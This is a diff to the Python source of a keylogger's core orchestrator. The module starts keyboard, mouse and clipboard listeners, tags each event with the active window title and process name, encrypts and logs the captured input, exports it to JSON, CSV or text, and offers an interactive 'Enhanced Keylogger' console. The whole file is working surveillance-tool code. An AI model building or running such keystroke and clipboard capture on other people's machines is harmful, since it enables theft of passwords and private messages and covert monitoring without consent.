@@ -1,373 +1,559 @@
-"""Main keylogger class with modular architecture and proper resource management."""
+"""Main KeyloggerCore orchestrator that coordinates all keylogger components."""
 
 import os
+import sys
 import time
 import threading
-import signal
-import sys
-from typing import Optional, Dict, Any, List
-from concurrent.futures import ThreadPoolExecutor
 import logging
+import signal
+from typing import Dict, Any, Optional, List
 from pathlib import Path
 
+# Import core modules
 from .config_manager import ConfigManager
 from .encryption_manager import EncryptionManager
 from .logging_manager import LoggingManager
+
+# Import listeners (will be imported dynamically to handle missing modules)
+try:
+    sys.path.append(str(Path(__file__).parent.parent))
+    from listeners.keyboard_listener import KeyboardListener
+    from listeners.mouse_listener import MouseListener
+    from listeners.clipboard_listener import ClipboardListener
+except ImportError as e:
+    logging.warning(f"Some listeners could not be imported: {e}")
+    KeyboardListener = None
+    MouseListener = None
+    ClipboardListener = None
+
+# Import utilities (Window Monitor)
+try:
+    from utils.window_monitor import WindowMonitor
+except Exception as e:
+    logging.warning(f"WindowMonitor import failed: {e}")
+    WindowMonitor = None
 
 logger = logging.getLogger(__name__)
 
 
 class KeyloggerCore:
-    """Main keylogger class with modular architecture."""
+    """Main keylogger orchestrator that manages all components."""
     
-    def __init__(self, config_file: str = "config.json"):
-        self.config = ConfigManager(config_file)
-        self.encryption: Optional[EncryptionManager] = None
-        self.log_manager: Optional[LoggingManager] = None
-        self.listeners: Dict[str, Any] = {}
-        self.threads: Dict[str, threading.Thread] = {}
-        self.thread_pool: Optional[ThreadPoolExecutor] = None
+    def __init__(self, config_path: Any = None):
+        """Initialize the keylogger core.
+        Accepts either a path to a config file or a ConfigManager-like object (with get/reload_config methods).
+        """
+        # Configuration handling (allow passing a ConfigManager-like object)
+        self.config_path = None
+        self.config_manager = None
+        if config_path is None or isinstance(config_path, str):
+            self.config_path = config_path or "config.json"
+        else:
+            # Injected config manager
+            self.config_manager = config_path
+            # Try to infer path if available
+            self.config_path = getattr(config_path, 'config_file', "config.json")
+        
+        # Runtime state
+        self._is_running = False
+        self.start_time = None
+        self.session_id = None
+        self.config = None  # Backward-compat convenience alias
+        
+        # Core components
+        # self.config_manager may have been injected above
+        self.encryption_manager = None
+        self.logging_manager = None
+        
+        # Listeners / Utilities
+        self.keyboard_listener = None
+        self.mouse_listener = None
+        self.clipboard_listener = None
+        self.window_monitor = None
+        
+        # Threading
+        self.main_thread = None
         self.stop_event = threading.Event()
-        self.is_running = False
-        self.session_stats = {
+        
+        # Statistics
+        self.stats = {
             'start_time': None,
-            'events_logged': 0,
+            'total_events': 0,
+            'keyboard_events': 0,
+            'mouse_events': 0,
+            'clipboard_events': 0,
             'errors': 0,
-            'active_window': None,
-            'window_start_time': None
+            'uptime_seconds': 0
         }
         
-        self._setup_signal_handlers()
-        self._initialize_components()
-    
-    def _setup_signal_handlers(self) -> None:
-        """Setup signal handlers for graceful shutdown."""
-        def signal_handler(signum, frame):
-            logger.info(f"Received signal {signum}, initiating shutdown...")
-            self.stop()
-            sys.exit(0)
+        # Session statistics for tracking current session state
+        self.session_stats = {
+            'active_window': 'Unknown',
+            'active_application': 'Unknown',
+            'session_start_time': None,
+            'last_activity_time': None,
+            'window_changes': 0,
+            'total_keystrokes': 0,
+            'total_mouse_clicks': 0,
+            'clipboard_changes': 0
+        }
         
-        signal.signal(signal.SIGINT, signal_handler)
-        signal.signal(signal.SIGTERM, signal_handler)
-        if hasattr(signal, 'SIGBREAK'):  # Windows
-            signal.signal(signal.SIGBREAK, signal_handler)
+        # Initialize components
+        self._initialize_components()
+        
+        # Initialize listeners and utilities during construction as tests expect
+        self._initialize_listeners()
+        self._initialize_utilities()
     
-    def _initialize_components(self) -> None:
-        """Initialize all keylogger components."""
+    def _initialize_components(self) -> bool:
+        """Initialize all core components."""
         try:
-            # Initialize encryption if enabled
-            if self.config.get('encryption.enabled', True):
-                key_file = self.config.get('encryption.key_file', 'encryption.key')
-                self.encryption = EncryptionManager(key_file)
+            logger.info("Initializing keylogger core components...")
+            
+            # Initialize configuration manager if not injected
+            if self.config_manager is None:
+                self.config_manager = ConfigManager(self.config_path)
+                if not self.config_manager.load_config():
+                    logger.error("Failed to load configuration")
+                    return False
+            
+            # Set config alias for backward compatibility
+            self.config = self.config_manager
+            
+            # Initialize encryption manager
+            self.encryption_manager = EncryptionManager()
+            if not getattr(self.encryption_manager, 'init_encryption', lambda: True)():
+                logger.warning("Encryption manager initialization failed, continuing without encryption")
             
             # Initialize logging manager
-            self.log_manager = LoggingManager(self.config, self.encryption)
+            self.logging_manager = LoggingManager(self.config_manager, self.encryption_manager)
             
-            # Initialize thread pool
-            pool_size = self.config.get('performance.thread_pool_size', 4)
-            self.thread_pool = ThreadPoolExecutor(max_workers=pool_size, thread_name_prefix='keylogger')
+            # Generate session ID
+            self.session_id = f"session_{int(time.time())}_{os.getpid()}"
             
-            logger.info("Keylogger components initialized successfully")
+            logger.info("Core components initialized successfully")
+            return True
             
         except Exception as e:
-            logger.error(f"Failed to initialize components: {e}")
-            raise
+            logger.error(f"Error initializing components: {e}")
+            return False
     
-    def start(self) -> None:
-        """Start the keylogger with all enabled features."""
-        if self.is_running:
-            logger.warning("Keylogger is already running")
-            return
-        
+    def _initialize_listeners(self) -> bool:
+        """Initialize event listeners based on configuration."""
         try:
-            self.session_stats['start_time'] = time.time()
-            self.is_running = True
+            logger.info("Initializing event listeners...")
+            
+            # Read feature flags with backward-compatible keys
+            kb_enabled = self.config_manager.get('features.keyboard', self.config_manager.get('features.keyboard_logging', True))
+            mouse_enabled = self.config_manager.get('features.mouse', self.config_manager.get('features.mouse_logging', True))
+            clip_enabled = self.config_manager.get('features.clipboard', self.config_manager.get('features.clipboard_logging', False))
+            
+            # Initialize keyboard listener
+            if kb_enabled and KeyboardListener is not None:
+                try:
+                    self.keyboard_listener = KeyboardListener(self)
+                    logger.info("Keyboard listener initialized")
+                except Exception as e:
+                    logger.error(f"Failed to initialize keyboard listener: {e}")
+            
+            # Initialize mouse listener
+            if mouse_enabled and MouseListener is not None:
+                try:
+                    self.mouse_listener = MouseListener(self)
+                    logger.info("Mouse listener initialized")
+                except Exception as e:
+                    logger.error(f"Failed to initialize mouse listener: {e}")
+            
+            # Initialize clipboard listener
+            if clip_enabled and ClipboardListener is not None:
+                try:
+                    self.clipboard_listener = ClipboardListener(self)
+                    logger.info("Clipboard listener initialized")
+                except Exception as e:
+                    logger.error(f"Failed to initialize clipboard listener: {e}")
+            
+            return True
+            
+        except Exception as e:
+            logger.error(f"Error initializing listeners: {e}")
+            return False
+    
+    def _initialize_utilities(self) -> None:
+        """Initialize utility components like WindowMonitor based on configuration."""
+        try:
+            win_enabled = self.config_manager.get('features.window_tracking', True)
+            if win_enabled and WindowMonitor is not None:
+                try:
+                    self.window_monitor = WindowMonitor(self)
+                    logger.info("Window monitor initialized")
+                except Exception as e:
+                    logger.error(f"Failed to initialize window monitor: {e}")
+        except Exception as e:
+            logger.error(f"Error initializing utilities: {e}")
+    
+    def start(self) -> bool:
+        """Start the keylogger."""
+        try:
+            if self._is_running:
+                logger.warning("Keylogger is already running")
+                return True
             
             logger.info("Starting keylogger...")
             
-            # Start listeners based on configuration
+            # Initialize listeners (ensure initialized)
+            if not self._initialize_listeners():
+                logger.error("Failed to initialize listeners")
+                return False
+            
+            # Set up signal handlers
+            self._setup_signal_handlers()
+            
+            # Start listeners
             self._start_listeners()
             
-            # Start monitoring threads
-            self._start_monitoring_threads()
+            # Update state
+            self._is_running = True
+            self.start_time = time.time()
+            self.stats['start_time'] = self.start_time
             
-            logger.info("Keylogger started successfully")
+            # Initialize session stats
+            self.session_stats['session_start_time'] = self.start_time
+            self.session_stats['last_activity_time'] = self.start_time
+            
+            # Log startup event
+            self.log_event('system', 'keylogger_started', metadata={
+                'session_id': self.session_id,
+                'config_file': self.config_path,
+                'features': {
+                    'keyboard': self.keyboard_listener is not None,
+                    'mouse': self.mouse_listener is not None,
+                    'clipboard': self.clipboard_listener is not None
+                }
+            })
+            
+            logger.info(f"Keylogger started successfully (Session: {self.session_id})")
+            return True
             
         except Exception as e:
-            logger.error(f"Failed to start keylogger: {e}")
-            self.session_stats['errors'] += 1
-            self.stop()
-            raise
+            logger.error(f"Error starting keylogger: {e}")
+            self.stats['errors'] += 1
+            return False
+    
+    def _setup_signal_handlers(self) -> None:
+        """Set up signal handlers for graceful shutdown."""
+        try:
+            signal.signal(signal.SIGINT, self._signal_handler)
+            signal.signal(signal.SIGTERM, self._signal_handler)
+            if hasattr(signal, 'SIGBREAK'):
+                signal.signal(signal.SIGBREAK, self._signal_handler)
+        except Exception as e:
+            logger.warning(f"Could not set up signal handlers: {e}")
+    
+    def _signal_handler(self, signum, frame):
+        """Handle shutdown signals."""
+        logger.info(f"Received signal {signum}, shutting down gracefully...")
+        self.stop()
     
     def _start_listeners(self) -> None:
-        """Start input listeners based on configuration."""
+        """Start all initialized listeners."""
         try:
-            # Import listeners here to avoid circular imports
-            from listeners.keyboard_listener import KeyboardListener
-            from listeners.mouse_listener import MouseListener
-            from listeners.clipboard_listener import ClipboardListener
-            
-            # Start keyboard listener
-            if self.config.is_feature_enabled('key_logging'):
-                self.listeners['keyboard'] = KeyboardListener(self)
-                self.listeners['keyboard'].start()
+            if self.keyboard_listener:
+                self.keyboard_listener.start()
                 logger.info("Keyboard listener started")
             
-            # Start mouse listener
-            if self.config.is_feature_enabled('mouse_logging'):
-                self.listeners['mouse'] = MouseListener(self)
-                self.listeners['mouse'].start()
+            if self.mouse_listener:
+                self.mouse_listener.start()
                 logger.info("Mouse listener started")
             
-            # Start clipboard listener
-            if self.config.is_feature_enabled('clipboard_logging'):
-                self.listeners['clipboard'] = ClipboardListener(self)
-                self.listeners['clipboard'].start()
+            if self.clipboard_listener:
+                self.clipboard_listener.start()
                 logger.info("Clipboard listener started")
-            
+                
         except Exception as e:
-            logger.error(f"Failed to start listeners: {e}")
-            raise
+            logger.error(f"Error starting listeners: {e}")
+            self.stats['errors'] += 1
     
-    def _start_monitoring_threads(self) -> None:
-        """Start monitoring threads for various features."""
+    def stop(self) -> bool:
+        """Stop the keylogger."""
         try:
-            # Import monitors here to avoid circular imports
-            from utils.window_monitor import WindowMonitor
-            from utils.screenshot_monitor import ScreenshotMonitor
-            from utils.usb_monitor import USBMonitor
-            from utils.performance_monitor import PerformanceMonitor
+            if not self._is_running:
+                logger.warning("Keylogger is not running")
+                return True
             
-            # Window monitoring
-            if self.config.is_feature_enabled('window_tracking'):
-                window_monitor = WindowMonitor(self)
-                self.threads['window'] = threading.Thread(
-                    target=window_monitor.run, 
-                    name='window-monitor',
-                    daemon=True
-                )
-                self.threads['window'].start()
-                logger.info("Window monitor started")
+            logger.info("Stopping keylogger...")
             
-            # Screenshot monitoring
-            if self.config.is_feature_enabled('screenshots'):
-                screenshot_monitor = ScreenshotMonitor(self)
-                self.threads['screenshot'] = threading.Thread(
-                    target=screenshot_monitor.run,
-                    name='screenshot-monitor', 
-                    daemon=True
-                )
-                self.threads['screenshot'].start()
-                logger.info("Screenshot monitor started")
-            
-            # USB monitoring
-            if self.config.is_feature_enabled('usb_monitoring'):
-                usb_monitor = USBMonitor(self)
-                self.threads['usb'] = threading.Thread(
-                    target=usb_monitor.run,
-                    name='usb-monitor',
-                    daemon=True
-                )
-                self.threads['usb'].start()
-                logger.info("USB monitor started")
-            
-            # Performance monitoring
-            performance_monitor = PerformanceMonitor(self)
-            self.threads['performance'] = threading.Thread(
-                target=performance_monitor.run,
-                name='performance-monitor',
-                daemon=True
-            )
-            self.threads['performance'].start()
-            logger.info("Performance monitor started")
-            
-        except Exception as e:
-            logger.error(f"Failed to start monitoring threads: {e}")
-            raise
-    
-    def stop(self) -> None:
-        """Stop the keylogger gracefully."""
-        if not self.is_running:
-            return
-        
-        logger.info("Stopping keylogger...")
-        
-        try:
-            # Signal all threads to stop
+            # Set stop flag
+            self._is_running = False
             self.stop_event.set()
-            self.is_running = False
             
             # Stop listeners
             self._stop_listeners()
             
-            # Wait for threads to finish
-            self._wait_for_threads()
+            # Log shutdown event
+            uptime = time.time() - self.start_time if self.start_time else 0
+            self.log_event('system', 'keylogger_stopped', metadata={
+                'session_id': self.session_id,
+                'uptime_seconds': uptime,
+                'total_events': self.stats['total_events']
+            })
             
-            # Cleanup resources
-            self._cleanup_resources()
-            
-            # Log session statistics
-            self._log_session_stats()
+            # Stop logging manager
+            if self.logging_manager:
+                self.logging_manager.stop()
             
             logger.info("Keylogger stopped successfully")
+            return True
             
         except Exception as e:
-            logger.error(f"Error during shutdown: {e}")
+            logger.error(f"Error stopping keylogger: {e}")
+            return False
     
     def _stop_listeners(self) -> None:
-        """Stop all input listeners."""
-        for name, listener in self.listeners.items():
-            try:
-                if hasattr(listener, 'stop'):
-                    listener.stop()
-                logger.debug(f"{name} listener stopped")
-            except Exception as e:
-                logger.error(f"Error stopping {name} listener: {e}")
-    
-    def _wait_for_threads(self) -> None:
-        """Wait for all threads to finish with timeout."""
-        timeout = 5.0  # seconds
-        
-        for name, thread in self.threads.items():
-            try:
-                thread.join(timeout=timeout)
-                if thread.is_alive():
-                    logger.warning(f"Thread {name} did not stop within timeout")
-                else:
-                    logger.debug(f"Thread {name} stopped")
-            except Exception as e:
-                logger.error(f"Error waiting for thread {name}: {e}")
-    
-    def _cleanup_resources(self) -> None:
-        """Cleanup all resources."""
+        """Stop all listeners."""
         try:
-            # Cleanup logging manager
-            if self.log_manager:
-                self.log_manager.cleanup()
+            if self.keyboard_listener:
+                self.keyboard_listener.stop()
+                logger.info("Keyboard listener stopped")
             
-            # Shutdown thread pool
-            if self.thread_pool:
-                self.thread_pool.shutdown(wait=True)
+            if self.mouse_listener:
+                self.mouse_listener.stop()
+                logger.info("Mouse listener stopped")
             
-            logger.debug("Resource cleanup completed")
-            
+            if self.clipboard_listener:
+                self.clipboard_listener.stop()
+                logger.info("Clipboard listener stopped")
+                
         except Exception as e:
-            logger.error(f"Error during resource cleanup: {e}")
+            logger.error(f"Error stopping listeners: {e}")
     
-    def _log_session_stats(self) -> None:
-        """Log session statistics."""
-        try:
-            if self.session_stats['start_time']:
-                duration = time.time() - self.session_stats['start_time']
-                self.session_stats['duration'] = duration
-            
-            logger.info("=== Session Statistics ===")
-            logger.info(f"Duration: {self.session_stats.get('duration', 0):.2f} seconds")
-            logger.info(f"Events logged: {self.session_stats['events_logged']}")
-            logger.info(f"Errors: {self.session_stats['errors']}")
-            
-            if self.log_manager:
-                log_stats = self.log_manager.get_stats()
-                logger.info(f"Buffer flushes: {log_stats.get('buffer_flushes', 0)}")
-                logger.info(f"Encryption operations: {log_stats.get('encryption_operations', 0)}")
-            
-            logger.info("=========================")
-            
-        except Exception as e:
-            logger.error(f"Error logging session stats: {e}")
+    def is_running(self) -> bool:
+        """Return whether the keylogger is currently running."""
+        return self._is_running
     
-    def log_event(self, event_type: str, details: str, window_name: str = "Unknown", 
-                  metadata: Optional[Dict[str, Any]] = None) -> None:
-        """Log an event through the logging manager."""
+    def log_event(self, event_type: str, content: Any, window: Optional[str] = None, metadata: Dict[str, Any] = None) -> bool:
+        """Log an event through the logging manager.
+        Signature: (event_type, content, window=None, metadata=None) for backward compatibility with tests.
+        """
         try:
-            if self.log_manager and self.is_running:
-                self.log_manager.log_event(event_type, details, window_name, metadata=metadata)
-                self.session_stats['events_logged'] += 1
+            if not self.logging_manager:
+                return False
+            
+            # Add session info to metadata
+            if metadata is None:
+                metadata = {}
+            metadata['session_id'] = self.session_id
+            
+            # Get current window if not provided
+            if window is None:
+                window = self._get_current_window()
+            
+            # Log the event
+            success = self.logging_manager.log_event(event_type, content, window, metadata)
+            
+            if success:
+                self.stats['total_events'] += 1
+                
+                # Update specific event counters
+                if event_type == 'keyboard':
+                    self.stats['keyboard_events'] += 1
+                elif event_type == 'mouse':
+                    self.stats['mouse_events'] += 1
+                elif event_type == 'clipboard':
+                    self.stats['clipboard_events'] += 1
+            
+            return success
+            
         except Exception as e:
             logger.error(f"Error logging event: {e}")
-            self.session_stats['errors'] += 1
+            self.stats['errors'] += 1
+            return False
     
-    def update_active_window(self, window_name: str) -> None:
-        """Update the currently active window."""
-        if self.session_stats['active_window'] != window_name:
-            # Log time spent on previous window
-            if (self.session_stats['active_window'] and 
-                self.session_stats['window_start_time']):
-                time_spent = time.time() - self.session_stats['window_start_time']
-                self.log_event(
-                    "Time Spent", 
-                    f"{time_spent:.2f} seconds",
-                    self.session_stats['active_window']
-                )
-            
-            # Update to new window
-            self.session_stats['active_window'] = window_name
-            self.session_stats['window_start_time'] = time.time()
-            self.log_event("Active Window Changed", f"Switched to {window_name}", window_name)
-    
-    def run(self) -> None:
-        """Run the keylogger until stopped."""
+    def _get_current_window(self) -> str:
+        """Get the current active window title."""
         try:
-            self.start()
+            import psutil
+            import win32gui
+            import win32process
             
-            # Keep running until stop event is set
-            while not self.stop_event.is_set():
-                self.stop_event.wait(1.0)
+            # Get foreground window
+            hwnd = win32gui.GetForegroundWindow()
+            if hwnd:
+                # Get window title
+                window_title = win32gui.GetWindowText(hwnd)
+                
+                # Get process info
+                _, pid = win32process.GetWindowThreadProcessId(hwnd)
+                try:
+                    process = psutil.Process(pid)
+                    process_name = process.name()
+                    return f"{process_name} - {window_title}"
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    return window_title or "Unknown Window"
             
-        except KeyboardInterrupt:
-            logger.info("Received keyboard interrupt")
+            return "Unknown Window"
+            
+        except ImportError:
+            # Fallback for systems without win32 modules
+            return "Unknown Window"
         except Exception as e:
-            logger.error(f"Unexpected error in main loop: {e}")
-            self.session_stats['errors'] += 1
-        finally:
-            self.stop()
+            logger.debug(f"Error getting window info: {e}")
+            return "Unknown Window"
     
-    def get_status(self) -> Dict[str, Any]:
-        """Get current keylogger status."""
-        status = {
-            'running': self.is_running,
-            'session_stats': self.session_stats.copy(),
-            'active_listeners': list(self.listeners.keys()),
-            'active_threads': [name for name, thread in self.threads.items() if thread.is_alive()],
-            'config_file': str(self.config.config_file)
-        }
-        
-        if self.log_manager:
-            status['logging_stats'] = self.log_manager.get_stats()
-        
-        if self.encryption:
-            status['encryption_info'] = self.encryption.get_key_info()
-        
-        return status
-    
-    def export_logs(self, output_file: str, format_type: str = 'json') -> None:
-        """Export logs in specified format."""
-        if self.log_manager:
-            self.log_manager.export_logs(output_file, format_type)
-        else:
-            raise RuntimeError("Logging manager not initialized")
-    
-    def reload_config(self) -> None:
-        """Reload configuration from file."""
+    def get_stats(self) -> Dict[str, Any]:
+        """Get keylogger statistics as a flat dictionary (backward compatible)."""
         try:
-            self.config.load_config()
-            logger.info("Configuration reloaded")
+            current_time = time.time()
+            
+            # Update uptime
+            if self.start_time:
+                self.stats['uptime_seconds'] = current_time - self.start_time
+            
+            return self.stats.copy()
+            
+        except Exception as e:
+            logger.error(f"Error getting stats: {e}")
+            return {'error': str(e)}
+    
+    def reload_config(self) -> bool:
+        """Reload configuration and restart components if needed."""
+        try:
+            logger.info("Reloading configuration...")
+            
+            # Reload config manager (tests expect reload_config to be called)
+            if hasattr(self.config_manager, 'reload_config'):
+                if not self.config_manager.reload_config():
+                    logger.error("Failed to reload configuration")
+                    return False
+            else:
+                # Fallback to load_config if reload not available
+                if not self.config_manager.load_config():
+                    logger.error("Failed to reload configuration via load_config")
+                    return False
+            
+            # Reload logging manager config
+            if self.logging_manager and hasattr(self.logging_manager, 'reload_config'):
+                self.logging_manager.reload_config()
+            
+            # Log config reload event
+            self.log_event('system', 'config_reloaded', metadata={
+                'config_file': self.config_path
+            })
+            
+            logger.info("Configuration reloaded successfully")
+            return True
+            
         except Exception as e:
             logger.error(f"Error reloading configuration: {e}")
-            raise
-
-    def get_stats(self) -> Dict[str, Any]:
-        """Get keylogger statistics."""
-        log_file = self.config.get('logging.file_path', 'keylog.txt')
-        log_size_mb = 0.0
+            return False
+    
+    def export_logs(self, output_file: str, format_type: str = 'json', 
+                   start_time: float = None, end_time: float = None) -> bool:
+        """Export logs using the logging manager."""
         try:
-            log_size_mb = os.path.getsize(log_file) / (1024 * 1024)
-        except:
-            pass
-        return {
-            'total_events': self.session_stats['events_logged'],
-            'buffer_size': len(self.log_manager.log_buffer) if self.log_manager else 0,
-            'log_file_size_mb': log_size_mb,
-            'active_listeners': len(self.listeners),
-            'errors': self.session_stats['errors']
-        }
+            if not self.logging_manager:
+                logger.error("Logging manager not initialized")
+                return False
+            
+            return self.logging_manager.export_logs(output_file, format_type, start_time, end_time)
+            
+        except Exception as e:
+            logger.error(f"Error exporting logs: {e}")
+            return False
+    
+    def run_interactive(self) -> None:
+        """Run keylogger in interactive mode with command interface."""
+        try:
+            if not self.start():
+                logger.error("Failed to start keylogger")
+                return
+            
+            print("\n" + "="*50)
+            print("Enhanced Keylogger - Interactive Mode")
+            print("="*50)
+            print(f"Session ID: {self.session_id}")
+            print("Commands: stats, export, reload, stop, help")
+            print("Press Ctrl+C to stop\n")
+            
+            while self._is_running:
+                try:
+                    command = input("> ").strip().lower()
+                    
+                    if command == 'stats':
+                        self._print_stats()
+                    elif command.startswith('export'):
+                        self._handle_export_command(command)
+                    elif command == 'reload':
+                        self.reload_config()
+                        print("Configuration reloaded")
+                    elif command == 'stop':
+                        break
+                    elif command == 'help':
+                        self._print_help()
+                    elif command == '':
+                        continue
+                    else:
+                        print(f"Unknown command: {command}. Type 'help' for available commands.")
+                        
+                except KeyboardInterrupt:
+                    break
+                except EOFError:
+                    break
+                except Exception as e:
+                    print(f"Error processing command: {e}")
+            
+            self.stop()
+            print("\nKeylogger stopped. Goodbye!")
+            
+        except Exception as e:
+            logger.error(f"Error in interactive mode: {e}")
+    
+    def _print_stats(self) -> None:
+        """Print current statistics."""
+        try:
+            stats = self.get_stats()
+            
+            print("\n" + "-"*30 + " STATISTICS " + "-"*30)
+            print(f"Session ID: {self.session_id}")
+            print(f"Running: {self._is_running}")
+            print(f"Uptime: {stats.get('uptime_seconds', 0):.1f} seconds")
+            print(f"Total Events: {stats.get('total_events', 0)}")
+            print(f"Keyboard Events: {stats.get('keyboard_events', 0)}")
+            print(f"Mouse Events: {stats.get('mouse_events', 0)}")
+            print(f"Clipboard Events: {stats.get('clipboard_events', 0)}")
+            print(f"Errors: {stats.get('errors', 0)}")
+            
+            # Logging manager stats if available
+            if self.logging_manager:
+                lm_stats = getattr(self.logging_manager, 'get_stats', lambda: {})()
+                print(f"\nLogging Buffer Size: {lm_stats.get('buffer_size', 0)}")
+                print(f"Events Written: {lm_stats.get('events_written', 0)}")
+                print(f"Events Encrypted: {lm_stats.get('events_encrypted', 0)}")
+                print(f"Log File Size: {lm_stats.get('log_file_size_mb', 0):.2f} MB")
+            
+            print("-"*73 + "\n")
+            
+        except Exception as e:
+            print(f"Error displaying stats: {e}")
+    
+    def _handle_export_command(self, command: str) -> None:
+        """Handle export command."""
+        try:
+            parts = command.split()
+            if len(parts) < 2:
+                print("Usage: export <filename> [format]")
+                print("Formats: json, csv, text")
+                return
+            
+            filename = parts[1]
+            format_type = parts[2] if len(parts) > 2 else 'json'
+            
+            if self.export_logs(filename, format_type):
+                print(f"Exported logs to {filename} ({format_type})")
+            else:
+                print("Failed to export logs")
+            
+        except Exception as e:
+            print(f"Error exporting logs: {e}")
+    
+    def _print_help(self) -> None:
+        print("Available commands:\n - stats\n - export <filename> [format]\n - reload\n - stop\n - help")
